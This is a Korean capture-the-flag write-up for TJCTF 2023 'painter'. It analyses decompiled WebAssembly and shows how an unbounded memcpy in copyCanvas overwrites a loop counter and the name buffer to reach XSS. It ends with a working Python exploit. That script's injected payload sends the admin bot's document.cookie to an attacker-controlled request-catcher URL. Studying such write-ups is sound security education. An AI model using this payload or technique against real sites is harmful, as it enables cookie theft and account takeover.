---
title: "TJCTF 2023 - Painter"
description: "TJCTF 2023 Painter"
dateString: May 2023
draft: false
tags: ["TJCTF_2023","TJCTF_2023 Painter"]
weight: 30
date: 2023-05-29
# cover:
    # image: ""
---
# painter
![](/blog/TJCTF_2023_Painter/image.png)
유사 그림판 컨셉인듯 하다.
Web Assembly 익스플로잇해서 admin bot의 쿠키 탈취가 목적이다.
Wasm 취약점 분석은 처음 해봐서 생소했다. 
admin-bot.js 파일과 dockerfile, app.py, index.wasm 등이 주어진다.

## Analysis
### admin-bot.js
```js
import flag from './flag.txt';

function sleep(time) {
    return new Promise(resolve => {
        setTimeout(resolve, time);
    });
}

export default {
    id: 'painter',
    name: 'painter',
    urlRegex: /^https:\/\/painter\.tjc\.tf\//,
    timeout: 10000,
    handler: async (url, ctx) => {
        const page = await ctx.newPage();
        await page.goto('https://painter.tjc.tf', { waitUntil: 'domcontentloaded' });

        await page.setCookie({
            name: 'flag',
            value: flag.trim(),
            domain: 'painter.tjc.tf',
        });

        await sleep(1000);

        await page.goto(url, { timeout: 10000, waitUntil: 'domcontentloaded' });
        await sleep(10000);
    }
};
```
![](/blog/TJCTF_2023_Painter/image-1.png)
admin bot 사이트 접속하면 url을 받아서 거기에 요청을 보내는 것을 알 수 있다.
쿠키에 flag가 들어있다.
쿠키 탈취가 목적이다.

### Dockerfile
```
FROM python:3.8.5-slim-buster

RUN pip install flask gunicorn
WORKDIR /app
COPY . .

EXPOSE 5000

ENTRYPOINT ["gunicorn", "-b", "0.0.0.0:5000", "-t", "4", "app:app"]
```

### app.py
```python
from flask import Flask, render_template, redirect, request
from uuid import uuid4

app = Flask(__name__)

images = {}


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/save', methods=['POST'])
def post_image():
    img, name = request.json['img'], request.json['name']
    id = uuid4()
    images[id] = {
        'img': img,
        'name': name
    }
    return redirect('/img/' + str(id))


@app.route('/img/<uuid:id>')
def image_id(id):
    if id not in images:
        return redirect('/')

    img = images[id]['img']
    name = images[id]['name']
    return render_template('index.html', px=img, name=name, saved=True)


if __name__ == '__main__':
    app.run(debug=True)

```
이미지를 저장하거나 볼 수 있는 것 같다.
### index.html
```html
<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">

    <style>
        body {
            height: 100vh;
            width: 100%;
            margin: 0;
            display: grid;
            justify-items: center;
            align-items: center;
            text-align: left;
        }

        #options {
            display: flex;
            flex-direction: row;
            justify-content: space-between;
        }

        #canvas {
            border: 1px solid black;
            height: 75vh;
            max-height: 1000px;
            image-rendering: pixelated;
        }

    </style>
</head>

<body>

    <div>
        <h1 id="name-h1"></h1>
        <canvas id="canvas" tabindex="-1"></canvas>
        <div>
            <input type="color" id="color-picker">
            <select id="layers">
                <option value="0">Top Layer</option>
                <option value="1">Middle Layer</option>
                <option value="2">Bottom Layer</option>
            </select>
            <input type="text" id="name" placeholder="Name">
            <button id="save">Save</button>
        </div>
    </div>

    <script type="text/javascript">
        const canvas = document.getElementById('canvas');
        Module = {
            canvas: canvas
        };

        window.addEventListener('keydown', (e) => {
            e.stopImmediatePropagation();
        }, true);

        window.addEventListener('keyup', (e) => {
            e.stopImmediatePropagation();
        }, true);

        const strToCharArr = (str) => {
            const ptr = _malloc(str.length + 1);
            Module.stringToUTF8(str, ptr, str.length + 1);
            return ptr;
        };

        const base64ToArr = (enc) => {
            const binary = atob(enc);
            const bytes = new Uint8Array(binary.length);
            for (let i = 0; i < bytes.length; i++) {
                bytes[i] = binary.charCodeAt(i);
            }

            return bytes;
        }

        const arrToCharArr = (arr) => {
            const ptr = _malloc(arr.length);
            Module.writeArrayToMemory(arr, ptr);
            return ptr;
        }

        const setName = () => {
            const name = UTF8ToString(_getName());
            document.getElementById('name-h1').innerHTML = name;
        }

        Module.onRuntimeInitialized = () => {
            _clearCanvas();

            {% if saved %}

            const px = '{{ px }}';
            const name = '{{ name }}';

            _clearCanvas();
            const bin = base64ToArr(px); // get img binary
            const arr = arrToCharArr(bin); 
            _copyCanvas(arr, bin.length);
            _setName(strToCharArr(name), name.length);

            {% endif %}

            document.addEventListener('mousemove', (e) => {
                const rect = canvas.getBoundingClientRect();
                const scale = canvas.width / rect.width;
                _draw((e.clientX - rect.left) * scale, (e.clientY - rect.top) * scale);
            });

            document.addEventListener('mousedown', (e) => {
                _toggleLeftMouseButton(1);
            });

            document.addEventListener('mouseup', (e) => {
                _toggleLeftMouseButton(0);
            });

            document.getElementById('color-picker').addEventListener('input', (e) => {
                const c = e.target.value.match(/[0-9a-fA-F]{2}/g).map(v => parseInt(v, 16));
                _setColor(...c);
            });

            document.getElementById('layers').addEventListener('change', (e) => {
                _setLayer(parseInt(e.target.value));
            });

            document.getElementById('name').addEventListener('input', (e) => {
                const name = e.target.value;
                _setName(strToCharArr(name), name.length);
            });

            document.getElementById('save').addEventListener('click', (e) => {
                const out = new Uint8Array(4 * canvas.width * canvas.height * 3);

                for (let i = 0; i < 3; i++) {
                    const layerPtr = _getLayer(i);
                    const layer = new Uint8Array(Module.HEAPU8.buffer, layerPtr, 4 * canvas.width * canvas.height);
                    out.set(layer, 4 * canvas.width * canvas.height * i);
                }

                const binary = btoa(String.fromCharCode(...out));
                const name = document.getElementById('name').value;

                fetch('/save', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        name: name,
                        img: binary
                    })
                }).then((res) => {
                    if (res.status === 200) {
                        navigator.clipboard.writeText(res.url);
                        alert('Save URL copied to clipboard!');
                    } else {
                        alert('Failed to save!');
                    }
                });
            })
        };
    </script>

    <script src="/static/index.js"></script>
</body>

</html>
````
저장할때 /save로 보내는 것을 알 수 있다.
wasm function들을 사용해서 처리한다.
index.js에서 export 하는 부분을 확인할 수 있다.



### index.js
```js
...
var asm = createWasm();
/** @type {function(...*):?} */
var ___wasm_call_ctors = createExportWrapper("__wasm_call_ctors");
/** @type {function(...*):?} */
var _getName = Module["_getName"] = createExportWrapper("getName");
/** @type {function(...*):?} */
var _getLayer = Module["_getLayer"] = createExportWrapper("getLayer");
/** @type {function(...*):?} */
var _setName = Module["_setName"] = createExportWrapper("setName");
/** @type {function(...*):?} */
var _free = createExportWrapper("free");
/** @type {function(...*):?} */
var _copyCanvas = Module["_copyCanvas"] = createExportWrapper("copyCanvas");
/** @type {function(...*):?} */
var _setColor = Module["_setColor"] = createExportWrapper("setColor");
/** @type {function(...*):?} */
var _setLayer = Module["_setLayer"] = createExportWrapper("setLayer");
/** @type {function(...*):?} */
var _toggleLeftMouseButton = Module["_toggleLeftMouseButton"] = createExportWrapper("toggleLeftMouseButton");
/** @type {function(...*):?} */
var _draw = Module["_draw"] = createExportWrapper("draw");
/** @type {function(...*):?} */
var _clearCanvas = Module["_clearCanvas"] = createExportWrapper("clearCanvas");
/** @type {function(...*):?} */
var _loop = Module["_loop"] = createExportWrapper("loop");
/** @type {function(...*):?} */
var _main = Module["_main"] = createExportWrapper("main");
/** @type {function(...*):?} */
var _malloc = createExportWrapper("malloc");
/** @type {function(...*):?} */
var ___errno_location = createExportWrapper("__errno_location");
/** @type {function(...*):?} */
var ___dl_seterr = createExportWrapper("__dl_seterr");
/** @type {function(...*):?} */
var _fflush = Module["_fflush"] = createExportWrapper("fflush");
/** @type {function(...*):?} */
var _emscripten_stack_init = function() {
  return (_emscripten_stack_init = Module["asm"]["emscripten_stack_init"]).apply(null, arguments);
};

/** @type {function(...*):?} */
var _emscripten_stack_get_free = function() {
  return (_emscripten_stack_get_free = Module["asm"]["emscripten_stack_get_free"]).apply(null, arguments);
};

/** @type {function(...*):?} */
var _emscripten_stack_get_base = function() {
  return (_emscripten_stack_get_base = Module["asm"]["emscripten_stack_get_base"]).apply(null, arguments);
};

/** @type {function(...*):?} */
var _emscripten_stack_get_end = function() {
  return (_emscripten_stack_get_end = Module["asm"]["emscripten_stack_get_end"]).apply(null, arguments);
};
...
```
대충 함수 export를 해준다.
### index.wasm
아래 디컴파일러를 사용해서 분석했다. 
wabt보다 훨씬 좋다.
https://github.com/wasmkit/diswasm

wasm 선형 메모리 얘기는 그냥 오프셋 가지고 메모리에 접근하는 것을 얘기하는 것 같다.
wasm은 따로 ASLR 같은 메모리 보호 기법이 없다.
global variable같은 것들은 그래서 주소가 하드코딩 되어있는듯? 하다.

#### setName()
```c
// O[0] Decompilation of $func238, known as $func5
export "setName"; // $func238 is exported to "setName"
void $func5(int arr, int param1) {
  // offset=0xc
  int ar;
  // offset=0x8
  int local_8;
  // offset=0x4
  int local_4;

  ar = arr;
  local_8 = param1;
  label$1: {
    label$2: {
      if ((((local_8 >= 0x8) & 0x1) == 0x0)) break label$2;
      break label$1;
    };
  };
  local_8 = local_8;
  local_4 = 0x0;
  label$3: {
    while (1) {
      if ((((local_4 < local_8) & 0x1) == 0x0)) break label$3;
      *((unsigned char *) local_4 + 0x2191c) = *((unsigned char *) (ar + local_4));
      local_4 = (local_4 + 0x1);
      break label$4;
    break ;
    };
  };
  *((unsigned char *) local_8 + 0x2191c) = 0x0;
  $free(ar);
  return;
}
```
0x2191c가 Name이다.
#### copyCanvas()
```c
// O[0] Decompilation of $func239, known as $func6
export "copyCanvas"; // $func239 is exported to "copyCanvas"
void $func6(int target, int length) {
  // offset=0xc
  int t;
  // offset=0x8
  int l;

  t = target;
  l = length;
  $memcpy((0x2091c + 0x1008), t, l); // 0x21924 
  $free(t);
  return;
}
```
0x21924에 length 만큼 복사한다.
#### getLayer()
```c
// O[0] Decompilation of $func237, known as $func4
export "getLayer"; // $func237 is exported to "getLayer"
int $func4(int param0) {
  // offset=0xc
  int local_c;

  local_c = param0;
  return ((0x2091c + 0x1008) + (local_c << 0xc));
}
```
0x21924가 Layer인 것 같다.

#### main()
```c

// O[2] Disassembly of $func248, known as $func15
export "main"; // $func248 is exported to "main"
int $func15(int param0, int param1) {
  // local index=2
  int local2;

  local2 = $func13();
  return local2;
}

```
#### func13()
```c

// O[2] Disassembly of $func246, known as $func13
int $func13() {
  // local index=0
  int local0;
  // local index=1
  int local1;
  // local index=2
  int local2;
  // local index=3
  int local3;
  // local index=4
  int local4;
  // local index=5
  int local5;
  // local index=6
  int local6;
  // local index=7
  int local7;
  // local index=8
  int local8;
  // local index=9
  int local9;
  // local index=10
  int local10;
  // local index=11
  int local11;
  // local index=12
  int local12;
  // local index=13
  int local13;
  // local index=14
  int local14;

  local0 = 0x20;
  $func18(local0);
  local1 = 0x20;
  local2 = 0x0;
  local3 = 0x20914;
  local4 = 0x20910;
  $func476(local1, local1, local2, local3, local4);
  local5 = 0x303;
  local6 = 0x0;
  $func80(local5, local6);
  local7 = 0x0;
  local8 = 0x20;
  local9 = $func670(local7, local8, local8, local8, local7, local7, local7, local7);
  local10 = 0x0;
  *((unsigned int *) local10 + 0x20918) = local9;
  local11 = 0x1;
  local12 = 0x0;
  local13 = 0x1;
  fimport_emscripten_set_main_loop(local11, local12, local13); // executes exported function named "loop" every tick
  local14 = 0x0;
  return local14;
}
```
tick 마다 "loop" 함수를 실행한다.
호스트 환경에서 실행시켜주기 때문에 "loop"는 export 해야 한다.

#### loop()
```c
// O[0] Decompilation of $func245, known as $func12
export "loop"; // $func245 is exported to "loop"
void $func12() {
  // offset=0x1c
  int local_1c;
  // offset=0x18
  int local_18;
  // offset=0x14
  int local_14;
  // offset=0x10
  int local_10;
  // offset=0xc
  int local_c;

  label$1: {
    if (((*((unsigned int *) *((unsigned int *) 0x20918)) & 0x2) == 0x0)) break label$1;
    $func686(*((unsigned int *) 0x20918));
  };
  local_1c = *((unsigned int *) *((unsigned int *) 0x20918) + 0x14);
  local_18 = 0x0;
  label$2: {
    while (1) {
      if ((((local_18 < (*((unsigned short *) 0x24924) & 0xffff)) & 0x1) == 0x0)) break label$2;
      local_14 = 0x0;
      local_10 = 0x0;
      label$4: {
        while (1) {
          if ((((local_10 < 0x3) & 0x1) == 0x0)) break label$4;
          label$6: {
            if ((*((unsigned char *) (((0x2091c + 0x1008) + (local_10 << 0xc)) + (local_18 + 0x3))) & 0xff)) break label$6;
            local_14 = local_10;
            break label$4;
          };
          local_10 = (local_10 + 0x1);
          break label$5;
        break ;
        };
      };
      *((unsigned char *) local_18 + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 << 0xc)) + local_18));
      *((unsigned char *) (local_18 + 0x1) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 << 0xc)) + (local_18 + 0x1)));
      *((unsigned char *) (local_18 + 0x2) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 << 0xc)) + (local_18 + 0x2)));
      *((unsigned char *) (local_18 + 0x3) + 0x2091c) = (0xff - (*((unsigned char *) (((0x2091c + 0x1008) + (local_14 << 0xc)) + (local_18 + 0x3))) & 0xff)); // 4번째 -> 0xff 뺴기
      local_18 = (local_18 + 0x4);
      break label$3;
    break ;
    };
  };
  fimport_emscripten_run_script(0x14fac /* "setName()" */ );
  $memcpy(local_1c, 0x2091c, 0x1000);
  label$7: {
    if (((*((unsigned int *) *((unsigned int *) 0x20918)) & 0x2) == 0x0)) break label$7;
    $func687(*((unsigned int *) 0x20918));
  };
  local_c = $func489(*((unsigned int *) 0x20910), *((unsigned int *) 0x20918));
  $func496(*((unsigned int *) 0x20910));
  $func499(*((unsigned int *) 0x20910), local_c, 0x0, 0x0);
  $func502(*((unsigned int *) 0x20910));
  $func488(local_c);
  return;
}
```
0x2091c에 0x24924만큼 0x21924를 복사한다.

대충 이제 구조를 그려보면
```
0x24924 -> count // while loop copy cnt
0x21924 -> Layers
0x2191c -> Name 
0x2091c -> pixels
Updated every tick
0x2091c = 0x21924
```
이런 전역 구조체? 정도로 생각할 수 있다.

4바이트씩 복사를 해주는데 이상하게 마지막 바이트는 0xff에서 빼서 넣어준다.


## Exploitation
index.html의 일부를 보면 아래와 같다.
```js
				const binary = btoa(String.fromCharCode(...out));
                const name = document.getElementById('name').value;

                fetch('/save', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        name: name,
                        img: binary
                    })
                }).then((res) => {
                    if (res.status === 200) {
                        navigator.clipboard.writeText(res.url);
                        alert('Save URL copied to clipboard!');
                    } else {
                        alert('Failed to save!');
                    }
                });
```
binary는 클라이언트단에서 컨트롤이 가능하다.
```js
            {% if saved %}

            const px = '{{ px }}';
            const name = '{{ name }}';

            _clearCanvas();
            const bin = base64ToArr(px); // get img binary
            const arr = arrToCharArr(bin); 
            _copyCanvas(arr, bin.length);
            _setName(strToCharArr(name), name.length);

            {% endif %}
```
\_copyCanvas를 호출하면서 length에 대한 경계 체크가 없다.
```c
  $memcpy((0x2091c + 0x1008), t, l); // 0x21924 
  $free(t);
```
l을 컨트롤할 수 있다.
t는 malloc으로 할당받은 버퍼다.

```
0x24924 -> count // while loop copy cnt
0x21924 -> Layers
0x2191c -> Name 
0x2091c -> pixels
Updated every tick
0x2091c = 0x21924
```
여기서 overflow를 내서 count를 덮을 수 있다.

그리고 tick 마다 loop가 호출된다.
```c
label$2: {
    while (1) {
      if ((((local_18 < (*((unsigned short *) 0x24924) & 0xffff)) & 0x1) == 0x0)) break label$2;
      local_14 = 0x0;
      local_10 = 0x0;
      label$4: {
        while (1) {
          if ((((local_10 < 0x3) & 0x1) == 0x0)) break label$4;
          label$6: {
            if ((*((unsigned char *) (((0x2091c + 0x1008) + (local_10 << 0xc)) + (local_18 + 0x3))) & 0xff)) break label$6;
            local_14 = local_10;
            break label$4;
          };
          local_10 = (local_10 + 0x1);
          break label$5;
        break ;
        };
      };
      *((unsigned char *) local_18 + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 << 0xc)) + local_18));
      *((unsigned char *) (local_18 + 0x1) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 << 0xc)) + (local_18 + 0x1)));
      *((unsigned char *) (local_18 + 0x2) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 << 0xc)) + (local_18 + 0x2)));
      *((unsigned char *) (local_18 + 0x3) + 0x2091c) = (0xff - (*((unsigned char *) (((0x2091c + 0x1008) + (local_14 << 0xc)) + (local_18 + 0x3))) & 0xff)); // 4번째 -> 0xff 뺴기
      local_18 = (local_18 + 0x4);
      break label$3;
    break ;
    };
```
```c
if ((((local_18 < (*((unsigned short *) 0x24924) & 0xffff)) & 0x1) == 0x0)) break label$2;
```
count를 overflow로 덮어서 얼마나 copy할지를 컨트롤 할 수 있다.
이때 Layer(0x2091c + 0x1008)가 pixels(0x2091c)로 4 바이트씩 copy된다.

```c
if ((((local_10 < 0x3) & 0x1) == 0x0)) break label$4;
          label$6: {
            if ((*((unsigned char *) (((0x2091c + 0x1008) + (local_10 << 0xc)) + (local_18 + 0x3))) & 0xff)) break label$6;
            local_14 = local_10;
```
여기 if문에서 local_14가 0이 아니게 되어버리면, << 0xc 때문에 0x1000 단위로 커져버린다.
여기서 if문을 안타고 들어가게 하려면 local_18은 증가하게 냅두고 그냥 payload를 넉넉하게 채우면 우회할 수 있다.

```
0x24924 -> count // while loop copy cnt
0x21924 -> Layers
0x2191c -> Name 
0x2091c -> pixels
Updated every tick
0x2091c = 0x21924
```
이때 적절한 count로 덮고 copy를 통해서 pixels에서 Name을 덮어버리면 나중에 loop에서 index.html의 setName을 호출해서 tick 마다 Name을 업데이트한다.
![](/blog/TJCTF_2023_Painter/image-2.png)
```js
        const setName = () => {
            const name = UTF8ToString(_getName());
            document.getElementById('name-h1').innerHTML = name;
        }
```
```c
      *((unsigned char *) (local_18 + 0x2) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 << 0xc)) + (local_18 + 0x2)));
      *((unsigned char *) (local_18 + 0x3) + 0x2091c) = (0xff - (*((unsigned char *) (((0x2091c + 0x1008) + (local_14 << 0xc)) + (local_18 + 0x3))) & 0xff)); // 4번째 -> 0xff 뺴기
      local_18 = (local_18 + 0x4);
      break label$3;
    break ;
    };
  };
  fimport_emscripten_run_script(0x14fac /* "setName()" */ );
```
원래 flask 템플릿에서 막혀서 xss를 트리거할 수 없을텐데 Name을 덮고 wasm 단에서 바꾸게 해버리면 xss를 트리거할 수 있다.

### Exploit script
```python
import base64
import requests
from pwn import p8,p16
BASE_URL = 'https://painter.tjc.tf'
attackerURL = 'https://qivuygm.request.dreamhack.games'

'''
0x24924 -> count // while loop copy cnt
0x21924 -> Layers
0x2191c -> Name 
0x2091c -> pixels
Updated every tick
0x2091c = 0x21924

'''
injection = f"<img src=@ onerror=window.location='{attackerURL}?flag='+document.cookie>"
def paygen(string : bytes):
    '''
    *((unsigned char *) local_18 + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 << 0xc)) + local_18));
      *((unsigned char *) (local_18 + 0x1) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 << 0xc)) + (local_18 + 0x1)));
      *((unsigned char *) (local_18 + 0x2) + 0x2091c) = *((unsigned char *) (((0x2091c + 0x1008) + (local_14 << 0xc)) + (local_18 + 0x2)));
      *((unsigned char *) (local_18 + 0x3) + 0x2091c) = (0xff - (*((unsigned char *) (((0x2091c + 0x1008) + (local_14 << 0xc)) + (local_18 + 0x3))) & 0xff)); // 4번째 -> 0xff 뺴기
    '''
    pay = b''
    for i in range(len(string)):
        if (i+1) % 4 == 0:
            pay += p8(0xff-string[i])
        else:
            pay += p8(string[i])
    return pay
pay = b'\xff'*(0x2191c- 0x2091c)
pay += paygen(injection.encode())
pay += b'\x00'*4
pay += b'\xff' * ((0x24924- 0x21924)-len(pay))
# pixels overflow 
'''
export "copyCanvas"; // $func239 is exported to "copyCanvas"
void $func6(int target, int length) {
  // offset=0xc
  int t;
  // offset=0x8
  int l;

  t = target;
  l = length;
  $memcpy((0x2091c + 0x1008), t, l); // 0x21924 
  $free(t);
  return;
}
            const bin = base64ToArr(px); // get img binary
            const arr = arrToCharArr(bin); 
            _copyCanvas(arr, bin.length);
'''
pay += p16(0x1000+len(injection)+4)
pay += b'\xff'*(0x70-2)
# print(pay[0x1000:0x1030])
# print(hex(pay[0x3000]),hex(pay[0x3001]))

# print(hex(len(pay)))
re = requests.post(f'{BASE_URL}/save', json={
    'img': base64.b64encode(pay).decode(),
    'name': 'exploit'
})
print(re.url)

```
admin bot한테 url주고 돌리면 flag 나온다.
![](/blog/TJCTF_2023_Painter/image-1-1.png)
`tjctf{m0n4_l1s4_1s_0verr4t3d_e2187c9a}`



